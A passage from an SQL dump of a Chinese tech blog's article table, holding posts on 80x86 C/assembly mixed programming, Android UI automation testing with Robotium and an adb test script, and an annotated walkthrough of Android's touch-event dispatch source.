s@\r\n```\r\n\r\n可以看到使用`public`关键字声明了全局变量`string`、`global`、`global_init`与函数`main`，以便外部去引用他们。同时也使用`extrn`关键字声明了外部定义的`_var_from_asm`、`_test_fun`、`_printf`，在链接时会解析这些标记完成偏移地址的修改。\r\n\r\n到这里我们已经分析完了`test.c`编译后的内容。\r\n\r\n下面是测试使用的汇编程序`t.asm`：\r\n\r\n```\r\npublic _test_fun\r\npublic _var_from_asm\r\nextrn _global:byte, _global_init:byte\r\n\r\n_DATA	segment use16 word public \'DATA\'\r\n    _var_from_asm label word\r\n        db 10\r\n        db 0\r\n_DATA ends\r\n\r\n_TEXT segment use16 byte public \'CODE\'\r\n    assume CS:_TEXT, DS:_DATA\r\n\r\n_test_fun proc near\r\n    push bp\r\n    mov bp, sp\r\n    push di\r\n    mov ax, 6[bp]\r\n    mov word ptr _global_init, ax\r\n    mov word ptr _global, 100\r\n    pop di\r\n    pop bp\r\n    ret\r\n_test_fun endp\r\n_TEXT ends\r\nend\r\n```\r\n\r\n程序比较简单，在头部同样地声明了对外的符号与引用的外部的符号。\r\n\r\n同时，为了实现与C程序的相互引用，我们使用相同的标识定义了`_DATA`段与`_TEXT`段，为了使C语言可以以`var_from_asm`的形式使用汇编中定义的变量，所以在`_DATA`段中使用`_var_from_asm`声明了两个字节并初始化为`10`的空间。\r\n\r\n同理，在`_TEXT`段中使用`_test_fun`作为子程序名定义了函数`test_fun`。\r\n\r\n而在`test_fun`中，我们先将`bp`入栈，将`sp`赋给`bp`后，将`bp+6`位置的值赋给了`ax`，在函数调用的时候，会先将参数入栈，然后将`CS`与`IP`入栈，占用了`4`个字节的栈空间，函数内调用`push bp`又占用了`2`个字节的栈空间，所以传入的参数应该在`bp+6`的位置上。我们将这个参数值写回到C语言定义的全局变量`_global_init`中，下一行将`_global`赋上了`100`。\r\n\r\n现在，就可以进行编译链接步骤了。\r\n\r\n一般地，我们可以使用C编译器编译`test.c`生成目标文件，使用`TASM`汇编编译器编译`t.asm`生成目标文件，再使用`tlink`将生成的目标文件与库提供的目标文件进行链接，但是这样做略显麻烦，`tcc`会调用`TASM`编译汇编文件，也会将生成的目标文件和库文件一起链接并生成最后的可执行文件，所以我们只要简单地执行`tcc test.c t.asm`就可以了。\r\n\r\n![img](https://www.viseator.com/images/8086asmc2.png)\r\n\r\n直接运行生成的test.exe，查看结果：\r\n\r\n![img](https://www.viseator.com/images/8086asmc3.png)', '2022-07-05 12:59:49', '在汇编课程中的实验中要求了我们在80x86下实现C语言与汇编代码的混合编程，虽然80x86时代离现代有些久远，但我们仍可以把80x86当作x86的一个简化版本来学习一些重要的概念。', 'https://www.viseator.com/images/8086asmc2.png', NULL, 0, NULL, NULL, '80x86下汇编与C语言的混合编程', '2022-07-05 12:59:49', 0, 59, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000174, NULL, NULL, '## 写在前面\r\n\r\n在[官方文档关于测试一节](https://developer.android.com/training/testing/fundamentals.html)中，介绍了测试金字塔这一概念：\r\n![img](https://www.viseator.com/images/ui_test_1.png)\r\n即我们应该包括三个层次的测试：小型、中型、与大型：\r\n\r\n- 小型测试是单元测试，即可以独立运行在每个模块上的测试。它们通常模拟了每个主要的组件并且应该快速地运行。\r\n\r\n- 中型测试是介于大型与小型测试之间的综合测试，它们集成了数个组件并且运行在模拟器或实机上。\r\n\r\n- 大型测试是以模拟UI工作流方式进行的综合UI测试，它们保证了关键的终端用户的使用可以符合我们的预期。\r\n\r\n  虽然小型测试迅速并且专注，可以让我们很快地发现错误，但它们同样是低仿真且自成一体的，这使得我们很难保证通过了所有的单元测试就可以成功地让App运行。而大型测试的优缺点恰恰与上述相反。\r\n\r\n  由于每个层次的测试的角色各不相同，我们应该进行所有这三个层次的测试，尽管各个层次使用比例需要根据App的使用特点，通常建议三个测试的比例为1:2:7。\r\n\r\n  UI自动化测试即属于上面说的大型测试。\r\n\r\n  \r\n\r\n  ## 测试框架功能对比\r\n\r\n  ### 概览\r\n\r\n  参考：\r\n\r\n- https://stackoverflow.com/questions/20046021/google-espresso-or-robotium\r\n\r\n  \r\n\r\n  ### 实际测试编写体验\r\n\r\n  实际的编写中，主要的步骤可以总结为三步：\r\n\r\n1. 如何定位想要操作的`View`\r\n2. 如何施加想要进行操作\r\n3. 如何判断App的行为符合我们预期\r\n   三种框架都为我们提供了一系列方法，但细节与效果略有不同：\r\n\r\n- Espresso\r\n\r\n  - 白盒测试，体现在可以直接拿到显示中的`View`实例，拿到`WebView` `DOM`树中的`Element`\r\n  - 一般场景下，区分度较为明显的`View`(有唯一的`id` `tag`)等，可以通过多种途径定位，较为便捷\r\n  - 面对特殊场景：如`TabLayout`中的`Tab`时，由于它们拥有相同的类型与`id`，难以定位`view`\r\n  - 出现多窗口情况（如`dialog`），可以正常处理\r\n  - 不能触发按返回键、改变屏幕方向等操作\r\n\r\n- UI Automator\r\n\r\n  - 黑盒测试，体现在无法拿到具体的`View`，只能拿到基类(`LinearLayout`等)，无法看到`WebView`的`DOM`树\r\n  - 一般场景下，定位`View`没有差别\r\n  - 面对特殊场景，可以通过找出所有符合条件的`View`再按索引找到想要的`View`\r\n  - 出现多窗口情况：处理出现异常\r\n\r\n- Robotium\r\n\r\n  - 集合了上述框架的优点，既可以拿到显示中的`View`实例与`WebView`的`DOM`树\r\n\r\n  - 对上述框架的接口进行了统一，调用比较方便\r\n\r\n    ### 最终框架选择\r\n\r\n    通过上述比较，可以看到Robotium在满足我们要求的同时统一了接口，故选择Robotium作为使用的框架。\r\n\r\n    ## 使用过程中踩的一些大坑\r\n\r\n    ### 变量必须使用static\r\n\r\n    在\r\n\r\n    ```\r\n    AndroidTest\r\n    ```\r\n\r\n    类中，期望使用一个\r\n\r\n    ```\r\n    boolean\r\n    ```\r\n\r\n    标志来判断是否已经登陆过（避免重复检查登陆状态），发现在\r\n\r\n    ```\r\n    login()\r\n    ```\r\n\r\n    方法中置标志为true后进入下一个测试时这个值仍为\r\n\r\n    ```\r\n    false\r\n    ```\r\n\r\n    ，推测运行测试方法时各个方法的运行是独立的，故不使用静态变量则无法保存状态。\r\n\r\n    ### 等待引发的问题\r\n\r\n    #### 等待？\r\n\r\n    在我们对\r\n\r\n    ```\r\n    View\r\n    ```\r\n\r\n    进行一个操作以后，框架会自动处理下一步动作触发的时机，比如点击一个\r\n\r\n    ```\r\n    Tab\r\n    ```\r\n\r\n    后，会自动等待下一个页面出现再执行下面的操作。这个等待判断的原理没有看过源码不能确定，但是实际中遇到比如\r\n\r\n    ```\r\n    WebView\r\n    ```\r\n\r\n    加载页这样等待时间较长的页面，就会触发下一个操作的执行。\r\n\r\n    那么问题就出现了，如果想要进行这样的测试：点击打开一个文档，等待文档打开完毕以后检查标题是否是我们打开的文档，如果在文档没有加载完的时候就执行检查步骤，就会产生\r\n\r\n    ```\r\n    Element not found\r\n    ```\r\n\r\n    的错误。\r\n\r\n    #### 解决方法\r\n\r\n- 强行设置等待时间\r\n  利用`SystemClock.sleep()`方法强行让测试暂停一段时间，这个方法比较暴力也不优雅，不到万不得已不要使用。\r\n\r\n- 使用\r\n\r\n  ```\r\n  Robotium\r\n  ```\r\n\r\n  提供的各种\r\n\r\n  ```\r\n  wait\r\n  ```\r\n\r\n  方法，通过设置退出条件来等待：\r\n\r\n  ```\r\n  private void waitForWebView() {\r\n      assertTrue(mSolo.waitForCondition(new Condition() {\r\n          @Override\r\n          public boolean isSatisfied() {\r\n              View loading = null;\r\n              try {\r\n                  loading = mSolo.getView(R.id.loading);\r\n              } catch (AssertionFailedError e) {\r\n                  Log.e(TAG, e.getMessage());\r\n              }\r\n              return null == loading || View.GONE == loading.getVisibility();\r\n          }\r\n      }, DOC_LOAD_TIMEOUT));\r\n  }\r\n  ```\r\n\r\n  在解决上面的问题的时候就使用了上面的代码来等待\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  文档加载完毕，返回\r\n\r\n  ```\r\n  true\r\n  ```\r\n\r\n  时条件满足，退出等待，若超时，则方法返回\r\n\r\n  ```\r\n  false\r\n  ```\r\n\r\n  ，\r\n\r\n  ```\r\n  assert\r\n  ```\r\n\r\n  失败表示\r\n\r\n  ```\r\n  doc\r\n  ```\r\n\r\n  加载超时。此处的判断方法是等待\r\n\r\n  ```\r\n  loading\r\n  ```\r\n\r\n  隐藏。\r\n\r\n  ```\r\n  private void waitForActivity(Class<? extends Activity> activity) {\r\n      if (mSolo.getCurrentActivity().getClass() == activity) {\r\n          return;\r\n      }\r\n      assertTrue(mSolo.waitForActivity(activity));\r\n  }\r\n  ```\r\n\r\n  上述代码是为了等待\r\n\r\n  ```\r\n  activity\r\n  ```\r\n\r\n  启动，可以用于判断新的\r\n\r\n  ```\r\n  activity\r\n  ```\r\n\r\n  是否正常启动。\r\n\r\n  ### 跨进程引发的问题\r\n\r\n  在应用中，打开的文档运行在一个新的进程中，在使用\r\n\r\n  ```\r\n  Espresso\r\n  ```\r\n\r\n  的时候就遇到了问题：无法拿到新进程中\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  的信息，原因没有仔细分析，但可以确定是跨进程的问题。在\r\n\r\n  ```\r\n  Robotium\r\n  ```\r\n\r\n  中这个问题同样存在。\r\n\r\n  不但如此，多进程还会导致当前\r\n\r\n  ```\r\n  activity\r\n  ```\r\n\r\n  的判断出错，本应判断在\r\n\r\n  ```\r\n  DocActivity\r\n  ```\r\n\r\n  中，但实际上得到的是在原进程的\r\n\r\n  ```\r\n  activity\r\n  ```\r\n\r\n  中。\r\n\r\n  在多种方法尝试无果后，只能暂时修改源码，将\r\n\r\n  ```\r\n  doc\r\n  ```\r\n\r\n  放在同进程打开。\r\n\r\n  ### View获取的问题\r\n\r\n  获取想要的\r\n\r\n  ```\r\n  View\r\n  ```\r\n\r\n  是编写用例最主要的难点所在，在获取\r\n\r\n  ```\r\n  View\r\n  ```\r\n\r\n  的时候也遇到了不少的坑：\r\n\r\n  #### 重复出现的View\r\n\r\n- *实际上通过`getCurrentViews()`获取到的View对象包括所有`activity`的所有`View`**，比如主页面有3个`tab`，每个`tab`中有一个`RecyclerView`，**这三个RecyclerView都是可以被获取到的（而不是想象中的只获取到当前可见的这个），甚至在打开新的`activity`后，后台的`activity`中的`RecyclerView`还是可以被获取到的。但是使用`getView()`方法获取的范围是当前`activity`。**\r\n  这意味着什么呢？如果这些`RecyclerView`有相同的`id`，使用`getView(int id)`方法获取到的只是第一个，即使切到了第二个`tab`，获取到的还是第一个`tab`中的`RecyclerView`。\r\n  面对这个情况我们可以用三种方法：\r\n\r\n- 如果它们`id`不同，使用`getView(int id)`就可以拿到特定的。如果`id`相同，可以传入第二个`index`参数来获取同`id`的第n个实例\r\n\r\n- 使用`getView(类名, int index)`拿到该类所有实例中的第n个，因为各个`RecyclerView`加载的顺序是相对固定的，所以每次运行拿到的`RecyclerView`是同一个。拿上面的例子来说，如果要拿到第二个`tab`中的`RecyclerView`，要获取的应该是第2个。\r\n\r\n- 先获取它的任意一个\r\n\r\n  ```\r\n  ParentView\r\n  ```\r\n\r\n  ，然后通过\r\n\r\n  ```\r\n  getCurrentViews(类名，ViewGroup)\r\n  ```\r\n\r\n  方法拿到\r\n\r\n  ```\r\n  List\r\n  ```\r\n\r\n  ，如果\r\n\r\n  ```\r\n  ViewGroup\r\n  ```\r\n\r\n  是唯一的，这个\r\n\r\n  ```\r\n  List\r\n  ```\r\n\r\n  中应该只会有我们想要的那个，也可以用\r\n\r\n  ```\r\n  ViewGroup\r\n  ```\r\n\r\n  来缩小我们搜索的范围。\r\n\r\n  #### View获取的技巧\r\n\r\n  总结一下\r\n\r\n- 定位`View`最为方便的就是使用`getView(int id/类名)`这个方式，如果`id`/类名的实例唯一，就可以直接拿到。\r\n\r\n- 如果同`id`/类名有很多个`view`存在，要使用`getView(int id/类名, int index)`，拿到第n个`view`实例。\r\n\r\n- 如果该\r\n\r\n  ```\r\n  view\r\n  ```\r\n\r\n  所处的\r\n\r\n  任一个`ViewGroup`很好获取（有唯一id/类名）\r\n\r\n  ，可以通过\r\n\r\n  ```\r\n  getCurrentViews(类名, ViewGroup)\r\n  ```\r\n\r\n  这个方式迅速缩小范围，拿到想要的\r\n\r\n  ```\r\n  View\r\n  ```\r\n\r\n  。\r\n\r\n  #### RecyclerView中获取ViewHolder\r\n\r\n  ```\r\n  Robotium\r\n  ```\r\n\r\n  允许我们直接拿到\r\n\r\n  ```\r\n  View\r\n  ```\r\n\r\n  对象，所以我们可以直接使用\r\n\r\n  ```\r\n  RecyclerView\r\n  ```\r\n\r\n  的\r\n\r\n  ```\r\n  findViewHolderForAdapterPosition()\r\n  ```\r\n\r\n  方法去拿\r\n\r\n  ```\r\n  ViewHolder\r\n  ```\r\n\r\n  ，但是事情并没有这么简单，我们知道\r\n\r\n  ```\r\n  RecyclerView\r\n  ```\r\n\r\n  的特点是没有在屏幕上显示的\r\n\r\n  ```\r\n  ViewHolder\r\n  ```\r\n\r\n  是没有被实例化的，这样拿到的会是\r\n\r\n  ```\r\n  null\r\n  ```\r\n\r\n  ，所以为了拿到所有\r\n\r\n  ```\r\n  ViewHolder\r\n  ```\r\n\r\n  我们还需要使用\r\n\r\n  ```\r\n  scrollDownRecyclerView()\r\n  ```\r\n\r\n  方法让\r\n\r\n  ```\r\n  RecyclerView\r\n  ```\r\n\r\n  滚动起来，但是使用这个方法还会有问题，有时候它会失效（怀疑是没有完成滚动就执行了下一条语句），\r\n\r\n  所以还需要在调用这个方法之后设一个延迟（100ms就行）\r\n\r\n  ，样例代码如下：\r\n\r\n  ```\r\n  for (int i = 0; i < listAdapter.getItemCount(); i++) {\r\n      RecyclerView.ViewHolder viewHolder = recyclerView.findViewHolderForAdapterPosition(i);\r\n      if (null == viewHolder) {\r\n          mSolo.scrollDownRecyclerView(0);\r\n          SystemClock.sleep(100);\r\n          viewHolder = recyclerView.findViewHolderForAdapterPosition(i);\r\n      }\r\n      if (testAction.test(listAdapter, viewHolder, i)) {\r\n          break;\r\n      }\r\n  }\r\n  ```\r\n\r\n  ### WebView中的WebElement获取需要延迟\r\n\r\n  之前介绍了等待\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  加载的方法，但是实际上这个方法返回后通过\r\n\r\n  ```\r\n  getWebElements()\r\n  ```\r\n\r\n  拿到的\r\n\r\n  ```\r\n  WebElements\r\n  ```\r\n\r\n  是空的，实际上想要拿到\r\n\r\n  ```\r\n  WebElement\r\n  ```\r\n\r\n  还要等待几秒种的时间。\r\n\r\n  ### 输入字符的问题\r\n\r\n  #### 直接输入字符的方法\r\n\r\n  ```\r\n  private void inputString(String text) {\r\n      InstrumentationRegistry.getInstrumentation().sendStringSync(text);\r\n  }\r\n  ```\r\n\r\n  会把\r\n\r\n  ```\r\n  string\r\n  ```\r\n\r\n  拆分成按键序列输入。\r\n\r\n  #### 丢失字符的问题\r\n\r\n  调用上面的方法输入的字符过长的时候会偶发出现字符丢失的问题，暂时不知道解决方法，只能输入短一点的字符。\r\n\r\n  ### 方法调用顺序的问题\r\n\r\n  写在\r\n\r\n  ```\r\n  AndroidTest\r\n  ```\r\n\r\n  文件夹下同一个测试类中的各个方法的调用顺序是未知的，而且没有找到好的办法可以直接在内部决定它们的调用顺序，本来这并不是一个大问题，但是在写测试的过程中出现了一个比较致命的问题：连续打开\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  会导致\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  无法加载。这个问题应该是由于复用了\r\n\r\n  ```\r\n  WebView\r\n  ```\r\n\r\n  或者\r\n\r\n  ```\r\n  loading view\r\n  ```\r\n\r\n  的判断出了问题导致的。单独单次地运行单个测试方法并不会出现这个问题，所以考虑转而使用手写测试脚本 的方式来决定方法的调用顺序并且单次地运行单个测试方法。同时脚本还应该支持重新编译测试Apk并且安装到手机，并且可以指定测试的方法与执行顺序。\r\n\r\n  最终编写完成的脚本如下：\r\n\r\n  ```\r\n  #!/bin/bash\r\n  function rebuild_install() {\r\n      ./gradlew --build-cache :app:assemblePublishxxxDebug :app:assemblePublishxxxDebugAndroidTest\r\n      adb push app/build/outputs/apk/publishxxx/debug/app-publish-xxx-debug.apk /data/local/tmp/com.xxx.xx.xxxx\r\n      adb shell pm install -t -r \"/data/local/tmp/com.xxx.xx.xxxx\"\r\n      adb push app/build/outputs/apk/androidTest/publishxxx/debug/app-publish-xxx-debug-androidTest.apk /data/local/tmp/com.xxx.xx.xxxx\r\n      adb shell pm install -t -r \"/data/local/tmp/com.xxx.xx.xxxx\"\r\n  }\r\n  \r\n  cd ..\r\n  if [ -n \"$1\" ] && [ \"$1\" = rebuild ]\r\n  then\r\n      rebuild_install\r\n  else\r\n      echo Not Rebuild\r\n  fi\r\n  \r\n  test_funcs=($(awk \'{print $0}\' ui_test/funtion_names.txt))\r\n  for funcs in ${test_funcs[@]}\r\n  do\r\n      echo ┌--------------------------------------\r\n      echo Start $funcs\r\n      adb shell am force-stop com.xxx.xx.xxxx\r\n      adb shell am instrument -w -r   -e debug false -e class com.xxx.xx.xxxx.MainInstrumentedTest#$funcs com.xxx.xx.xxxx.test/android.support.test.runner.AndroidJUnitRunner | sed -En -e \'/There was/,/FAILURES/p;/OK/p\'\r\n      echo └--------------------------------------\r\n  done\r\n  ```\r\n\r\n  需要测试的方法按顺序放在funtion_names.txt文件中：\r\n\r\n  ```\r\n  checkLogout\r\n  checkNewDoc\r\n  checkCreateDoc\r\n  checkOpenShare\r\n  ```\r\n\r\n  在使用时可以传入\r\n\r\n  ```\r\n  rebuild\r\n  ```\r\n\r\n  参数来重新构建并安装，未传入可以直接开始测试：\r\n\r\n  ```\r\n  ./test.sh rebuild // 重新构建并安装\r\n  ./test.sh //直接测试\r\n  ```\r\n\r\n  运行结果示例：\r\n\r\n  ```\r\n  Not Rebuild\r\n  ┌--------------------------------------\r\n  Start checkLogout\r\n  OK (1 test)\r\n  └--------------------------------------\r\n  ┌--------------------------------------\r\n  Start checkNewDoc\r\n  OK (1 test)\r\n  └--------------------------------------\r\n  ┌--------------------------------------\r\n  Start checkCreateDoc\r\n  OK (1 test)\r\n  └--------------------------------------\r\n  ┌--------------------------------------\r\n  Start checkOpenShare\r\n  OK (1 test)\r\n  └--------------------------------------\r\n  ```', '2022-07-05 13:03:27', '在官方文档关于测试一节中，介绍了测试金字塔这一概念', 'https://www.viseator.com/images/ui_test_1.png', NULL, 0, NULL, NULL, 'Android UI自动化测试技术选择与踩坑', '2022-07-05 13:03:27', 0, 54, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000175, NULL, NULL, '## View触摸事件分发\r\n\r\n经过[前面的两篇文章](http://www.viseator.com/2017/09/14/android_view_event_1/)，我们终于从内核（触摸事件的真正来源）一路经过`Native`层通过消息机制来到了需要接收的应用的主线程消息队列中然后被处理，首先调用的是应用根`View`（`DecorView`)的`dispatchPointerEvent()`方法（继承自`View`）：\r\n\r\n```\r\npublic final boolean dispatchPointerEvent(MotionEvent event) {\r\n    if (event.isTouchEvent()) {\r\n        return dispatchTouchEvent(event);\r\n    } else {\r\n        return dispatchGenericMotionEvent(event);\r\n    }\r\n}\r\n```\r\n\r\n调用了`ViewGroup`的`dispatchTouchEvent()`方法（`DecorView`继承自`FrameLayout`）：\r\n\r\n\r\n\r\n### dispatchTouchEvent(ViewGroup)\r\n\r\n顾名思义，这个方法就是`ViewGroup`的触摸事件分发方法，它重写了父类`View`的该方法，`View`也有自己的`dispatchTouchEvent()`方法（后面再讲）。\r\n\r\n这个方法非常长，我们拆开来分析，首先我们要明确一点，由于`Android`在系统级别引入了辅助功能选项（`AccessibilityFoucs`）来帮助有障碍的用户使用系统，所以如果一个事件带有`TargetAccessibilityFocus`标志，说明这是一个特殊的辅助功能事件，需要进行特殊处理（虽然这种情况比较少见）。\r\n\r\n```\r\n  @Override\r\n  public boolean dispatchTouchEvent(MotionEvent ev) {	\r\n// 如果是辅助功能事件，并且当前view是目标view，那么取消标志，进行普通分发\r\nif (ev.isTargetAccessibilityFocus() && isAccessibilityFocusedViewOrHost()) {\r\n          ev.setTargetAccessibilityFocus(false);\r\n      }\r\n\r\n      boolean handled = false;\r\n// 安全原因检查触摸事件\r\n      if (onFilterTouchEventForSecurity(ev)) {\r\n          final int action = ev.getAction();\r\n          final int actionMasked = action & MotionEvent.ACTION_MASK;\r\n	// 如果事件类型是按下，清除之前的处理，重新开始处理触摸动作\r\n          if (actionMasked == MotionEvent.ACTION_DOWN) {\r\n              cancelAndClearTouchTargets(ev);\r\n              resetTouchState();\r\n          }\r\n	// 拦截标志（重要）\r\n          final boolean intercepted;\r\n          // 如果是按下事件（新的触摸动作），或者已经存在处理事件的子View\r\n          if (actionMasked == MotionEvent.ACTION_DOWN\r\n                  || mFirstTouchTarget != null) {\r\n              // 检查是否不允许拦截事件（requestDisallowInterceptTouchEvent(true)被调用的情况）\r\n              final boolean disallowIntercept = (mGroupFlags & FLAG_DISALLOW_INTERCEPT) != 0;\r\n              if (!disallowIntercept) {\r\n                  // 调用onInterceptTouchEvent方法确定是否拦截事件（后面讲）\r\n                  intercepted = onInterceptTouchEvent(ev);\r\n                  ev.setAction(action); // 恢复action状态以避免其在上一行中被改变\r\n              } else {\r\n                  // 不拦截（不允许）\r\n                  intercepted = false;\r\n              }\r\n          } else {\r\n              // 如果不是一个新触摸动作的开始（不是down），并且没有处理该消息的目标（mFirstTouchTarget为null），说明当前view应该负责处理该事件，则当前view应该继续拦截并处理这个事件\r\n              intercepted = true;\r\n          }\r\n	// 如果被当前view拦截，或者已经有处理该事件的目标，则去除辅助功能标志，进行普通的事件分发\r\n          if (intercepted || mFirstTouchTarget != null) {\r\n              ev.setTargetAccessibilityFocus(false);\r\n          }\r\n```\r\n\r\n这一段就是检测该`view`是否应该被拦截，虽然没有看下面的代码，我们可以猜测如果`intercepted`标志为`true`，那么这个事件就会留在该`view`被处理而不会再向其子`view`分发。下面是`ViewGroup`默认的处理方式：\r\n\r\n#### onInterceptTouchEvent()\r\n\r\n\r\n\r\n```\r\npublic boolean onInterceptTouchEvent(MotionEvent ev) {\r\n    if (ev.isFromSource(InputDevice.SOURCE_MOUSE)\r\n            && ev.getAction() == MotionEvent.ACTION_DOWN\r\n            && ev.isButtonPressed(MotionEvent.BUTTON_PRIMARY)\r\n            && isOnScrollbarThumb(ev.getX(), ev.getY())) {\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n```\r\n\r\n这个方法默认只是对一个特殊情况作了特殊的拦截处理。\r\n\r\n### dispatchTouchEvent(ViewGroup)\r\n\r\n继续向下：\r\n\r\n```\r\n// 检查是否为取消事件\r\nfinal boolean canceled = resetCancelNextUpFlag(this)\r\n                 || actionMasked == MotionEvent.ACTION_CANCEL;\r\n// 分离触摸事件标志，如果是多点触摸，分别分发给多个view\r\n         final boolean split = (mGroupFlags & FLAG_SPLIT_MOTION_EVENTS) != 0;\r\n         TouchTarget newTouchTarget = null;\r\n         boolean alreadyDispatchedToNewTouchTarget = false;\r\n// 如果未被取消并且没有被当前view拦截，应该进行向下分发\r\n         if (!canceled && !intercepted) {\r\n\r\n           // 如果是辅助功能事件，我们调用findChildWithAccessibilityFocus()来找到接收该事件的目标view  \r\n           View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus()\r\n                     ? findChildWithAccessibilityFocus() : null;\r\n	// 如果是一个按下事件（初始事件）\r\n             if (actionMasked == MotionEvent.ACTION_DOWN\r\n                     || (split && actionMasked == MotionEvent.ACTION_POINTER_DOWN)\r\n                     || actionMasked == MotionEvent.ACTION_HOVER_MOVE) {\r\n                 final int actionIndex = ev.getActionIndex(); // 按下事件为0\r\n                 // 获取触摸点对应的PointerId，一个id表示一个触摸点，如果不分离，则获取全部的id\r\n                 final int idBitsToAssign = split ? 1 << ev.getPointerId(actionIndex)\r\n                         : TouchTarget.ALL_POINTER_IDS;\r\n\r\n                 // 清除之前的id信息\r\n                 removePointersFromTouchTargets(idBitsToAssign);\r\n\r\n                 final int childrenCount = mChildrenCount;\r\n                 if (newTouchTarget == null && childrenCount != 0) {\r\n                     final float x = ev.getX(actionIndex);\r\n                     final float y = ev.getY(actionIndex);\r\n					// 创建待遍历的view列表，调用了buildTouchDispatchChildList()方法（见下文）\r\n                     final ArrayList<View> preorderedList = buildTouchDispatchChildList();\r\n                     // 是否采用自定义view顺序（这个顺序将决定哪个view会先接收到事件）\r\n                     final boolean customOrder = preorderedList == null\r\n                             && isChildrenDrawingOrderEnabled();\r\n                     final View[] children = mChildren;\r\n```\r\n\r\n这段主要为后面的查找目标`view`作准备，我们先建立了`preorderedList`列表，我们来看看这个列表的顺序是如何构建的：\r\n\r\n#### 构建待遍历的view数组\r\n\r\n```\r\npublic ArrayList<View> buildTouchDispatchChildList() {\r\n	return buildOrderedChildList();\r\n}\r\nArrayList<View> buildOrderedChildList() {\r\n    final int childrenCount = mChildrenCount;\r\n    // 如果子view数小于等于1，或没有子view有z轴，直接返回null\r\n    if (childrenCount <= 1 || !hasChildWithZ()) return null;\r\n\r\n    if (mPreSortedChildren == null) {\r\n        mPreSortedChildren = new ArrayList<>(childrenCount);\r\n    } else {\r\n        mPreSortedChildren.clear();\r\n        mPreSortedChildren.ensureCapacity(childrenCount);\r\n    }\r\n	// 如果自定义绘制顺序，则应使用自定义分发顺序\r\n    final boolean customOrder = isChildrenDrawingOrderEnabled();\r\n    for (int i = 0; i < childrenCount; i++) {\r\n        // 获取正确的子view索引（不为自定义顺序时为i，自定义顺序时为自定义顺序对应的索引\r\n        final int childIndex = getAndVerifyPreorderedIndex(childrenCount, i, customOrder);\r\n        final View nextChild = mChildren[childIndex];\r\n        // 保存z值\r\n        final float currentZ = nextChild.getZ();\r\n\r\n        // 如果列表中最后一个view的z值大于待插入的view，将当前view插入其之前，保证在后面从后向前遍历view时可以保存在屏幕最上面的view可以先接收到触摸事件\r\n        int insertIndex = i;\r\n        while (insertIndex > 0 && mPreSortedChildren.get(insertIndex - 1).getZ() > currentZ) {\r\n            insertIndex--;\r\n        }\r\n        mPreSortedChildren.add(insertIndex, nextChild);\r\n    }\r\n    return mPreSortedChildren;\r\n}\r\n```\r\n\r\n总的来说，就是如果有自定义绘制顺序，那么按自定义绘制顺序，否则按默认绘制顺序，然后如果`view`定义了`z`值属性，那么在屏幕最上层的`view`应该先接收到触摸事件。\r\n\r\n### dispatchTouchEvent(ViewGroup)\r\n\r\n回到分发方法，继续向下：\r\n\r\n```\r\n				for (int i = childrenCount - 1; i >= 0; i--) {\r\n                        // 从preorderList中获取到正确的索引与子view\r\n                        final int childIndex = getAndVerifyPreorderedIndex(\r\n                                childrenCount, i, customOrder);\r\n                        final View child = getAndVerifyPreorderedView(\r\n                                preorderedList, children, childIndex);\r\n\r\n                        // 如果需要处理辅助功能事件（找到了目标子view） if (childWithAccessibilityFocus != null) {\r\n                            // 保证该子view最先接收到事件\r\n                            if (childWithAccessibilityFocus != child) {\r\n                                continue;\r\n                            }\r\n                            // 找到该子view后清除目标的记录\r\n                            childWithAccessibilityFocus = null;\r\n                            // 如果该子view没有处理辅助功能事件，那么应该重新遍历view进行普通分发，故将i重置\r\n                            i = childrenCount - 1;\r\n                        }\r\n			// 两个方法分别检查子view是否能接收触摸事件 与 触摸事件在该view的范围内，如果都成立，说明找到了应该处理该事件的子view\r\n                        if (!canViewReceivePointerEvents(child)\r\n                                || !isTransformedTouchPointInView(x, y, child, null)) {\r\n                            ev.setTargetAccessibilityFocus(false);\r\n                            continue;\r\n                        }\r\n\r\n                        // 找到了目标子view，检查touchTarget链表中是否已经存在这个view\r\n                        newTouchTarget = getTouchTarget(child);\r\n                        if (newTouchTarget != null) {\r\n                            // 链表中已经存在该view，说明该子view已经接收过按下（初始）的触摸事件，说明这是一个多点触摸的情况，把新的点加入touchTarget并退出子view遍历\r\n                        newTouchTarget.pointerIdBits |= idBitsToAssign;\r\n                            break;\r\n                        }\r\n			\r\n                        resetCancelNextUpFlag(child);\r\n                        // 在dispatchTransformedTouchEvent()方法中进行下一层的事件分发，如果该方法返回true，说明事件被后续的view处理了\r\n                        if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) {\r\n                            // 保存mLastTouchDownTime、mLastTouchDownIndex、mLastTouchDownX、mLastTouchDownY\r\n                            mLastTouchDownTime = ev.getDownTime();\r\n                            if (preorderedList != null) {\r\n                                for (int j = 0; j < childrenCount; j++) {\r\n                                    if (children[childIndex] == mChildren[j]) {\r\n                                        mLastTouchDownIndex = j;\r\n                                        break;\r\n                                    }\r\n                                }\r\n                            } else {\r\n                                mLastTouchDownIndex = childIndex;\r\n                            }\r\n                            mLastTouchDownX = ev.getX();\r\n                            mLastTouchDownY = ev.getY();\r\n                            // 保存该view到touchTarget链表\r\n                            newTouchTarget = addTouchTarget(child, idBitsToAssign);\r\nalreadyDispatchedToNewTouchTarget = true;\r\n                            break; // 退出对子view的遍历，一个事件只会被分发给一个子view\r\n                        }\r\n                        ev.setTargetAccessibilityFocus(false);\r\n                    } // 这里是遍历view循环结束点\r\n		// 清除preorderedList，避免view泄露\r\n                    if (preorderedList != null) preorderedList.clear();\r\n                } // 这里if (newTouchTarget == null && childrenCount != 0) 判断结束点\r\n```\r\n\r\n首先明确一点，这段代码整个都是在\r\n\r\n```\r\nif (actionMasked == MotionEvent.ACTION_DOWN\r\n        || (split && actionMasked == MotionEvent.ACTION_POINTER_DOWN)\r\n        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) 